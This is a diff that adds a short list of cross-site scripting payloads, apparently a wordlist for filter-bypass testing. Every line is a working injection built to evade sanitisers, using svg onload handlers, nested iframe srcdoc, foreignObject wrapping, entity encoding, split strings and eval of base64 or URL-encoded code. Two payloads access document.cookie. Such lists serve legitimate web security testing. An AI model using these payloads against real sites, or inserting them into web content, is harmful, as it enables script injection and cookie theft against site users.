@@ -1,0 +1,10 @@
+<svg onload=window['al'+'ert'](document['cookie'])>
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#116;('XSS')>">
+<iframe srcdoc="<script>window['al'+'ert']('XSS')</script>">
+<svg><foreignObject><iframe srcdoc="<img src=x onerror=alert(1)>"></foreignObject></svg>
+<iframe srcdoc="<svg onload=window['al'+'ert']('XSS')>">
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))>
+<svg><foreignObject><iframe srcdoc="<svg onload=alert(1)>"></foreignObject></svg>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>">
+<svg onload=window['al'+'ert'](document['cookie'])>
